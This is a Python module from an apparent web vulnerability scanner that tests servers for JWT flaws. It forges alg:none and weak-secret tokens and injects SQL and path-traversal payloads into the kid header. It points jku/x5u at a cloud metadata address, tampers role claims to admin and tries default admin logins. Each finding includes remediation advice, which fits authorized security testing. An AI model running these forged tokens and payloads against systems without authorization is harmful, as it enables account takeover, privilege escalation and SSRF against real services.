"""
PhantomScan — JWT Attack Scanner
Attaques sur les JSON Web Tokens :
  - alg:none          : suppression de la signature
  - HMAC weak secrets : brute-force sur dictionnaire
  - RS256 → HS256     : confusion de clé publique
  - kid injection     : SQL / path traversal dans l'ID de clé
  - jku / x5u SSRF   : header pointant vers JWK Set contrôlé
  - nbf / exp bypass  : tokens expirés / not-yet-valid
  - Claim tampering   : élévation de privilège (admin, role, scope)
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from typing import AsyncIterator
from urllib.parse import urlparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin


# ── Helpers JWT ───────────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    """Décode base64url sans padding strict."""
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Parse un JWT, retourne (header, payload, signature_b64) ou None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_jwt(header: dict, payload: dict, secret: bytes = b"") -> str:
    """Forge un JWT signé HMAC-SHA256 (ou alg:none si secret=None)."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    alg = header.get("alg", "HS256").upper()

    if alg == "NONE":
        return f"{h}.{p}."

    hash_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = hash_map.get(alg, hashlib.sha256)
    sig = hmac.new(secret, signing_input, hash_fn).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


# ── Dictionnaire de secrets faibles ──────────────────────────────────────────

WEAK_SECRETS: list[str] = [
    "", "secret", "password", "123456", "qwerty", "changeme",
    "mysecret", "jwt_secret", "jwtSecret", "jwt-secret", "jwt",
    "supersecret", "super_secret", "app_secret", "appsecret",
    "token", "auth", "auth_token", "authtoken", "key", "private",
    "private_key", "privatekey", "secretkey", "secret_key",
    "admin", "root", "test", "dev", "development", "production",
    "HS256", "HS384", "HS512", "RS256", "none",
    "your-256-bit-secret", "your-secret", "your_secret",
    "signingKey", "signing_key", "hmac_key", "hmackey",
    "flask_secret", "django_secret", "rails_secret",
    "node_secret", "express_secret", "laravel_secret",
    "0123456789abcdef", "abcdefghijklmnop",
    "keyboard cat", "shhhhh", "wouldyoulikefries",
    "toomanysecrets", "unsafe",
]

# ── Payloads kid injection ────────────────────────────────────────────────────

_KID_PAYLOADS: list[tuple[str, str]] = [
    # (valeur kid injectée, description)
    ("../../dev/null",            "path traversal → /dev/null (secret vide)"),
    ("../../dev/null\x00",        "null-byte path traversal"),
    ("/dev/null",                 "absolute path /dev/null"),
    ("' OR '1'='1",               "SQLi OR dans kid"),
    ("' UNION SELECT 'secret'--", "SQLi UNION dans kid"),
    ("1 OR 1=1--",                "SQLi numrique kid"),
    ("../../../etc/passwd",       "path traversal → /etc/passwd"),
    ("../../proc/self/environ",   "path traversal → /proc/self/environ"),
]

# ── Détection JWT dans les réponses / requêtes ────────────────────────────────

_JWT_RE = re.compile(
    r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]*"
)

# Headers où les JWT voyagent couramment
_JWT_HEADERS: list[str] = [
    "Authorization",
    "X-Auth-Token",
    "X-Access-Token",
    "X-JWT-Token",
    "Token",
    "Auth",
]

# Indicateurs de succès d'authentification dans la réponse
_AUTH_SUCCESS_RE = re.compile(
    r'"(token|access_token|jwt|auth_token|id_token|bearer)"',
    re.I,
)
_AUTH_FAIL_RE = re.compile(
    r"(invalid|expired|unauthorized|signature|forbidden|not authorized)",
    re.I,
)

# Claims à escalader lors du claim tampering
_PRIV_CLAIM_ESCALATIONS: list[tuple[str, object, str]] = [
    # (claim, valeur_escaladée, description)
    ("role",    "admin",        "role → admin"),
    ("roles",   ["admin"],      "roles → [admin]"),
    ("isAdmin", True,           "isAdmin → true"),
    ("is_admin",True,           "is_admin → true"),
    ("admin",   True,           "admin → true"),
    ("scope",   "admin openid", "scope → admin"),
    ("group",   "admin",        "group → admin"),
    ("groups",  ["admin"],      "groups → [admin]"),
    ("user_type","admin",       "user_type → admin"),
    ("userType","admin",        "userType → admin"),
    ("level",   0,              "level → 0 (superuser)"),
    ("privilege","superuser",   "privilege → superuser"),
    ("access",  "full",         "access → full"),
    ("sub",     "0",            "sub → 0 (root uid)"),
    ("sub",     "1",            "sub → 1"),
    ("user_id", 1,              "user_id → 1 (admin)"),
    ("userId",  1,              "userId → 1 (admin)"),
]


class JWTScanner(ScannerMixin):
    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req   = req
        self._heur  = heuristic
        self._cfg   = cfg

    async def run(self, target: str) -> AsyncIterator[Finding]:
        # ── 1. Découverte des tokens JWT ─────────────────────────────────────
        tokens = await self._discover_tokens(target)

        if not tokens:
            # Pas de JWT trouvé → signaler quand même si endpoints auth détectés
            async for f in self._probe_auth_endpoints(target):
                yield f
            return

        for token, source in tokens:
            parsed = _parse_jwt(token)
            if not parsed:
                continue
            header, payload, _ = parsed

            # ── 2. alg:none ──────────────────────────────────────────────────
            async for f in self._test_alg_none(target, header, payload, token, source):
                yield f

            # ── 3. Weak HMAC secret ──────────────────────────────────────────
            async for f in self._test_weak_secret(target, header, payload, token, source):
                yield f

            # ── 4. RS256 → HS256 confusion ───────────────────────────────────
            async for f in self._test_rs256_confusion(target, header, payload, token, source):
                yield f

            # ── 5. kid injection ─────────────────────────────────────────────
            async for f in self._test_kid_injection(target, header, payload, token, source):
                yield f

            # ── 6. jku / x5u SSRF ───────────────────────────────────────────
            async for f in self._test_jku_ssrf(target, header, payload, token, source):
                yield f

            # v5.20 — jku SSRF via OOB canary
            async for f in self._test_jku_ssrf_oob(target, header, payload, token, source):
                yield f

            # ── 7. Claim tampering ───────────────────────────────────────────
            async for f in self._test_claim_tamper(target, header, payload, token, source):
                yield f

            # ── 8. exp / nbf bypass ──────────────────────────────────────────
            async for f in self._test_time_claims(target, header, payload, token, source):
                yield f

    # ── Découverte des tokens ─────────────────────────────────────────────────

    async def _discover_tokens(self, target: str) -> list[tuple[str, str]]:
        """
        Cherche des JWTs dans :
        - La réponse HTTP de la cible
        - Les cookies Set-Cookie
        - Les headers de réponse
        """
        tokens: list[tuple[str, str]] = []
        resp = await self._req.get(target)
        if resp.error:
            return tokens

        # Body
        for m in _JWT_RE.finditer(resp.body or ""):
            tokens.append((m.group(), "response body"))

        # Headers de réponse
        for hname, hval in (resp.headers or {}).items():
            for m in _JWT_RE.finditer(hval):
                tokens.append((m.group(), f"response header {hname}"))

        # Tentative de login basique pour obtenir un token
        login_token = await self._try_get_auth_token(target)
        if login_token:
            tokens.append((login_token, "auth endpoint"))

        return tokens

    async def _try_get_auth_token(self, target: str) -> str | None:
        """Tente quelques endpoints d'auth courants pour récupérer un JWT."""
        parsed = urlparse(target)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        auth_endpoints = ["/api/login", "/auth/login", "/login", "/api/token",
                          "/api/auth", "/token", "/api/v1/login", "/api/v1/token"]
        test_creds = [
            '{"username":"admin","password":"admin"}',
            '{"email":"admin@test.com","password":"password"}',
            '{"user":"test","pass":"test"}',
        ]

        for endpoint in auth_endpoints:
            for body in test_creds[:1]:  # Limiter aux spam
                resp = await self._req.send(ProbeRequest(
                    method="POST",
                    url=base + endpoint,
                    headers={"Content-Type": "application/json"},
                    body=body,
                ))
                if resp.error or resp.status >= 500:
                    continue
                for m in _JWT_RE.finditer(resp.body or ""):
                    return m.group()
        return None

    async def _probe_auth_endpoints(self, target: str) -> AsyncIterator[Finding]:
        """Si aucun JWT trouvé, signale les endpoints auth détectés sans token."""
        parsed = urlparse(target)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        for ep in ["/api/login", "/auth", "/login", "/api/token"]:
            resp = await self._req.get(base + ep)
            if not resp.error and resp.status in (200, 401, 405):
                yield Finding(
                    title=f"JWT — Endpoint auth détecté sans token observable ({ep})",
                    severity=Severity.INFO if hasattr(Severity, "INFO") else Severity.LOW,
                    url=base + ep,
                    module="vulns/jwt",
                    description=(
                        f"Un endpoint d'authentification a été détecté à `{ep}` "
                        "mais aucun JWT n'a pu être extrait automatiquement. "
                        "Une inspection manuelle est recommandée."
                    ),
                    evidence=f"HTTP {resp.status} sur {base + ep}",
                    cwe="CWE-287",
                    remediation="Vérifier manuellement la gestion des tokens JWT sur cet endpoint.",
                )
                return

    # ── alg:none ──────────────────────────────────────────────────────────────

    async def _test_alg_none(
        self, target: str, header: dict, payload: dict, orig: str, source: str
    ) -> AsyncIterator[Finding]:
        variants = [
            {**header, "alg": "none"},
            {**header, "alg": "None"},
            {**header, "alg": "NONE"},
            {**header, "alg": "nOnE"},
        ]
        for fake_header in variants:
            forged = _forge_jwt(fake_header, payload)
            resp = await self._send_jwt(target, forged)
            if resp and self._jwt_accepted(resp):
                yield Finding(
                    title=f"JWT — alg:none accepté (source: {source})",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/jwt",
                    description=(
                        "Le serveur accepte un JWT avec l'algorithme `none`, "
                        "ce qui signifie que la signature est ignorée. "
                        "Un attaquant peut forger n'importe quel token sans connaître le secret."
                    ),
                    evidence=(
                        f"Token forgé accepté: {forged[:80]}... | "
                        f"alg utilisé: {fake_header['alg']} | HTTP {resp.status}"
                    ),
                    cwe="CWE-347",
                    remediation=(
                        "Rejeter explicitement l'algorithme `none` côté serveur. "
                        "Utiliser une liste blanche d'algorithmes autorisés (ex: HS256, RS256). "
                        "Ne jamais faire confiance au champ `alg` du header JWT pour choisir "
                        "la méthode de vérification."
                    ),
                )
                return

    # ── Weak HMAC secret ──────────────────────────────────────────────────────

    async def _test_weak_secret(
        self, target: str, header: dict, payload: dict, orig: str, source: str
    ) -> AsyncIterator[Finding]:
        alg = header.get("alg", "HS256").upper()
        if not alg.startswith("HS"):
            return

        orig_parts = orig.split(".")
        if len(orig_parts) != 3:
            return
        signing_input = f"{orig_parts[0]}.{orig_parts[1]}".encode()
        orig_sig = _b64url_decode(orig_parts[2]) if orig_parts[2] else None

        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hash_fn  = hash_map.get(alg, hashlib.sha256)

        for secret in WEAK_SECRETS:
            secret_bytes = secret.encode()
            expected_sig = hmac.new(secret_bytes, signing_input, hash_fn).digest()

            # Vérification locale d'abord (pas de requête réseau)
            if orig_sig and hmac.compare_digest(expected_sig, orig_sig):
                # Confirmer sur le réseau avec un token forgé modifié
                tampered_payload = {**payload, "_ps_probe": 1}
                forged = _forge_jwt(header, tampered_payload, secret_bytes)
                resp = await self._send_jwt(target, forged)
                yield Finding(
                    title=f"JWT — Secret HMAC faible découvert (source: {source})",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/jwt",
                    description=(
                        f"Le secret utilisé pour signer les tokens JWT ({alg}) a été "
                        f"retrouvé par brute-force : `{secret if secret else '(chaîne vide)'}`. "
                        "Un attaquant peut forger des tokens valides avec n'importe quel contenu."
                    ),
                    evidence=(
                        f"Secret trouvé: `{secret}` | Algo: {alg} | "
                        f"Source token: {source}"
                    ),
                    cwe="CWE-326",
                    remediation=(
                        "Utiliser un secret HMAC d'au moins 256 bits généré aléatoirement. "
                        "Ne jamais utiliser de mots du dictionnaire comme secret JWT. "
                        "Préférer RS256/ES256 (asymétrique) pour les architectures distribuées. "
                        "Invalider tous les tokens existants et régénérer le secret."
                    ),
                )
                return

    # ── RS256 → HS256 confusion ───────────────────────────────────────────────

    async def _test_rs256_confusion(
        self, target: str, header: dict, payload: dict, orig: str, source: str
    ) -> AsyncIterator[Finding]:
        if header.get("alg") != "RS256":
            return

        # On forge un token HS256 signé avec une clé publique simulée (probe)
        # En pratique, l'attaque réelle nécessite la clé publique récupérée via JWKS
        # Ici on sonde si le serveur accepte HS256 là où RS256 est attendu
        confused_header = {**header, "alg": "HS256"}
        forged = _forge_jwt(confused_header, payload, b"public_key_placeholder")
        resp = await self._send_jwt(target, forged)
        if resp and self._jwt_accepted(resp):
            yield Finding(
                title=f"JWT — Confusion d'algorithme RS256→HS256 (source: {source})",
                severity=Severity.CRITICAL,
                url=target,
                module="vulns/jwt",
                description=(
                    "Le serveur semble accepter des tokens HS256 alors qu'il émet des tokens RS256. "
                    "Une attaque de confusion d'algorithme est possible : en signant un token HS256 "
                    "avec la clé publique RSA (récupérable via /jwks ou /.well-known/jwks.json), "
                    "un attaquant peut forger des tokens valides sans la clé privée."
                ),
                evidence=(
                    f"Token HS256 potentiellement accepté | alg original: RS256 | "
                    f"Source: {source} | HTTP {resp.status}"
                ),
                cwe="CWE-327",
                remediation=(
                    "Imposer l'algorithme côté serveur, indépendamment du header JWT. "
                    "Ne jamais utiliser la valeur `alg` du token pour choisir la méthode "
                    "de vérification. Utiliser des bibliothèques JWT à jour qui rejettent "
                    "la confusion RS256/HS256 (python-jose ≥ 3.3, PyJWT ≥ 2.4, jsonwebtoken ≥ 9)."
                ),
            )

    # ── kid injection ─────────────────────────────────────────────────────────

    async def _test_kid_injection(
        self, target: str, header: dict, payload: dict, orig: str, source: str
    ) -> AsyncIterator[Finding]:
        # Tester même si le token original n'a pas de champ `kid` :
        # certains serveurs ajoutent dynamiquement la résolution de clé via kid
        # si le header en contient un — on injecte donc kid de toute façon.
        for kid_payload, kid_desc in _KID_PAYLOADS:
            injected_header = {**header, "kid": kid_payload}
            # Pour /dev/null (secret vide) : signer avec secret vide
            secret = b"" if "null" in kid_payload.lower() else b"secret"
            forged = _forge_jwt(injected_header, payload, secret)
            resp = await self._send_jwt(target, forged)
            if resp and self._jwt_accepted(resp):
                yield Finding(
                    title=f"JWT — kid injection ({kid_desc}) (source: {source})",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/jwt",
                    description=(
                        f"Injection détectée dans le champ `kid` du header JWT : `{kid_payload}`. "
                        f"Type: {kid_desc}. "
                        "Un attaquant peut manipuler le chemin de résolution de clé pour "
                        "utiliser un secret connu ou vide."
                    ),
                    evidence=(
                        f"kid injecté: `{kid_payload}` | HTTP {resp.status} | "
                        f"Source token: {source}"
                    ),
                    cwe="CWE-22",
                    remediation=(
                        "Valider et sanitiser le champ `kid` avant de l'utiliser pour "
                        "résoudre une clé. Utiliser une liste blanche d'identifiants de clé. "
                        "Ne jamais utiliser le `kid` comme chemin de fichier ou requête SQL directe."
                    ),
                )
                return

        # Combo spécifique : alg:none + kid → /dev/null (secret vide garanti côté serveur)
        # Certains serveurs ignorent la signature quand kid résout un fichier vide
        # ET que alg:none est accepté simultanément — double vecteur combiné.
        combo_header = {**header, "alg": "none", "kid": "../../dev/null"}
        combo_forged = _forge_jwt(combo_header, payload)
        combo_resp = await self._send_jwt(target, combo_forged)
        if combo_resp and self._jwt_accepted(combo_resp):
            yield Finding(
                title=f"JWT — alg:none + kid:/dev/null combo (source: {source})",
                severity=Severity.CRITICAL,
                url=target,
                module="vulns/jwt",
                description=(
                    "Combinaison alg:none + kid path traversal vers /dev/null acceptée. "
                    "Le serveur ignore la signature (alg:none) ET résout la clé depuis "
                    "un fichier vide (/dev/null), permettant une forge totale de token "
                    "sans aucun secret."
                ),
                evidence=(
                    f"alg:none | kid: ../../dev/null | "
                    f"Token: {combo_forged[:80]}... | HTTP {combo_resp.status}"
                ),
                cwe="CWE-347",
                remediation=(
                    "Rejeter l'algorithme `none` inconditionnellement. "
                    "Valider le `kid` via une liste blanche — jamais comme chemin filesystem. "
                    "Ces deux vecteurs doivent être bloqués indépendamment l'un de l'autre."
                ),
            )

    # ── jku / x5u SSRF ───────────────────────────────────────────────────────

    async def _test_jku_ssrf_oob(
        self, target: str, header: dict, payload: dict, orig: str, source: str
    ) -> AsyncIterator[Finding]:
        """
        v5.20 — Test jku SSRF via OOB canary (si disponible).
        Forge un JWT avec jku pointant vers le canary. Si le serveur
        fetche la JWK Set, on reçoit un callback OOB.
        """
        if not (self.oob and self.oob.enabled):
            return

        for jku_claim in ("jku", "x5u"):
            canary = self.get_canary(tag=f"jwt-{jku_claim}")
            if canary is None:
                continue

            # Forger un token avec jku → canary
            injected_header = {**header, jku_claim: canary.http_url}
            forged = _forge_jwt(injected_header, payload, b"probe")
            await self._send_jwt(target, forged)

            hits = await self.wait_for_oob_hit(canary, timeout=8.0)
            if hits:
                yield Finding(
                    title=f"JWT — {jku_claim} SSRF CONFIRMED (OOB callback) · {source}",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/jwt",
                    description=(
                        f"Le serveur a effectué une requête HTTP vers l'URL {jku_claim} "
                        f"contenu dans le header JWT. Un attaquant peut héberger un JWK Set "
                        f"malveillant à cette URL pour faire accepter n'importe quel token."
                    ),
                    evidence=(
                        f"OOB callback reçu | {jku_claim}={canary.http_url} | "
                        f"proto={hits[0].get('protocol','?')} | remote={hits[0].get('remote_address','?')}"
                    ),
                    cwe="CWE-918",
                    remediation=(
                        "Rejeter tout JWT contenant les claims jku/x5u. "
                        "Configurer la liste de clés publiques acceptées côté serveur, "
                        "sans jamais faire confiance aux URLs fournies dans le token."
                    ),
                )


    async def _test_jku_ssrf(
        self, target: str, header: dict, payload: dict, orig: str, source: str
    ) -> AsyncIterator[Finding]:
        parsed_target = urlparse(target)
        base = f"{parsed_target.scheme}://{parsed_target.netloc}"

        for jku_claim in ("jku", "x5u"):
            if jku_claim not in header:
                continue

            # Pointer vers un endpoint interne connu pour vérifier si la requête est faite
            ssrf_urls = [
                "http://169.254.169.254/latest/meta-data/",
                f"{base}/nonexistent_jwks_probe_{int(time.time())}.json",
            ]
            for ssrf_url in ssrf_urls[:1]:
                injected_header = {**header, jku_claim: ssrf_url}
                forged = _forge_jwt(injected_header, payload, b"probe")
                resp = await self._send_jwt(target, forged)
                if resp and not resp.error:
                    yield Finding(
                        title=f"JWT — {jku_claim} SSRF potentiel (source: {source})",
                        severity=Severity.HIGH,
                        url=target,
                        module="vulns/jwt",
                        description=(
                            f"Le header JWT contient le claim `{jku_claim}` qui pointe vers "
                            f"une URL externe pour résoudre la clé publique. "
                            "Si le serveur effectue une requête vers cette URL, "
                            "une attaque SSRF est possible via un JWK Set malveillant."
                        ),
                        evidence=(
                            f"{jku_claim} injecté: `{ssrf_url}` | "
                            f"HTTP {resp.status} | Source: {source}"
                        ),
                        cwe="CWE-918",
                        remediation=(
                            f"Ne pas utiliser le claim `{jku_claim}` pour résoudre dynamiquement "
                            "la clé de vérification. Utiliser une clé statique ou un JWKS local. "
                            "Si `jku` est nécessaire, appliquer une liste blanche stricte des URLs autorisées."
                        ),
                    )
                    return

    # ── Claim tampering ───────────────────────────────────────────────────────

    async def _test_claim_tamper(
        self, target: str, header: dict, payload: dict, orig: str, source: str
    ) -> AsyncIterator[Finding]:
        alg = header.get("alg", "").upper()
        if alg not in ("NONE", "") and not alg.startswith("HS"):
            return  # Sans le secret, on ne peut pas signer → skip

        for claim, escalated_value, desc in _PRIV_CLAIM_ESCALATIONS:
            if claim not in payload:
                continue
            if payload[claim] == escalated_value:
                continue

            tampered = {**payload, claim: escalated_value}
            # Essayer alg:none
            forged = _forge_jwt({**header, "alg": "none"}, tampered)
            resp = await self._send_jwt(target, forged)
            if resp and self._jwt_accepted(resp):
                yield Finding(
                    title=f"JWT — Élévation de privilège via claim `{claim}` (source: {source})",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/jwt",
                    description=(
                        f"Le claim `{claim}` a été modifié ({desc}) dans un token forgé "
                        f"avec alg:none, et le serveur l'a accepté. "
                        "Une élévation de privilège est possible."
                    ),
                    evidence=(
                        f"Claim: {claim} | Original: {payload[claim]} → Forgé: {escalated_value} | "
                        f"HTTP {resp.status}"
                    ),
                    cwe="CWE-269",
                    remediation=(
                        "Valider les claims d'autorisation côté serveur indépendamment du token. "
                        "Ne jamais faire confiance aux claims de rôle/privilege sans vérification "
                        "croisée avec la base de données utilisateur. "
                        "Rejeter l'algorithme `none` systématiquement."
                    ),
                )
                return

    # ── exp / nbf bypass ──────────────────────────────────────────────────────

    async def _test_time_claims(
        self, target: str, header: dict, payload: dict, orig: str, source: str
    ) -> AsyncIterator[Finding]:
        now = int(time.time())

        # Test exp dépassé (token expiré mais encore accepté ?)
        if "exp" in payload and payload["exp"] < now:
            resp = await self._send_jwt(target, orig)
            if resp and self._jwt_accepted(resp):
                yield Finding(
                    title=f"JWT — Token expiré accepté (source: {source})",
                    severity=Severity.HIGH,
                    url=target,
                    module="vulns/jwt",
                    description=(
                        f"Le serveur accepte un token JWT dont le claim `exp` "
                        f"({payload['exp']}) est dépassé (maintenant: {now}). "
                        "La vérification d'expiration n'est pas appliquée."
                    ),
                    evidence=(
                        f"exp: {payload['exp']} | now: {now} | "
                        f"Delta: {now - payload['exp']}s | HTTP {resp.status}"
                    ),
                    cwe="CWE-613",
                    remediation=(
                        "Vérifier systématiquement le claim `exp` lors de la validation du token. "
                        "Définir une durée de vie courte (15-60 min) et implémenter un mécanisme "
                        "de refresh token. Utiliser des bibliothèques JWT qui vérifient `exp` "
                        "par défaut."
                    ),
                )

        # Test nbf dans le futur (token pas encore valide mais accepté ?)
        if "nbf" not in payload:
            return
        future_payload = {**payload, "nbf": now + 3600, "exp": now + 7200}
        alg = header.get("alg", "").upper()
        if alg.startswith("HS") or alg in ("NONE", ""):
            forged = _forge_jwt({**header, "alg": "none"}, future_payload)
            resp = await self._send_jwt(target, forged)
            if resp and self._jwt_accepted(resp):
                yield Finding(
                    title=f"JWT — Claim `nbf` ignoré (source: {source})",
                    severity=Severity.MEDIUM,
                    url=target,
                    module="vulns/jwt",
                    description=(
                        "Le serveur accepte un token JWT dont le claim `nbf` (not before) "
                        "est dans le futur, indiquant que cette contrainte temporelle n'est "
                        "pas vérifiée."
                    ),
                    evidence=(
                        f"nbf forgé: {future_payload['nbf']} | now: {now} | HTTP {resp.status}"
                    ),
                    cwe="CWE-613",
                    remediation=(
                        "Vérifier le claim `nbf` lors de la validation du token. "
                        "S'assurer que la bibliothèque JWT utilisée vérifie `nbf` par défaut."
                    ),
                )

    # ── Helpers réseau ────────────────────────────────────────────────────────

    async def _send_jwt(self, target: str, token: str):
        """Envoie le token via Authorization: Bearer et les headers JWT courants."""
        for header_name in _JWT_HEADERS[:2]:  # Limiter aux 2 plus courants
            resp = await self._req.send(ProbeRequest(
                method="GET",
                url=target,
                headers={header_name: f"Bearer {token}" if header_name == "Authorization" else token},
            ))
            if not resp.error:
                return resp
        return None

    @staticmethod
    def _jwt_accepted(resp) -> bool:
        """Heuristique : le token a été accepté si pas de 401/403 et pas d'erreur auth."""
        if resp.status in (401, 403):
            return False
        if resp.status >= 500:
            return False
        body = resp.body or ""
        if _AUTH_FAIL_RE.search(body):
            return False
        return resp.status < 400
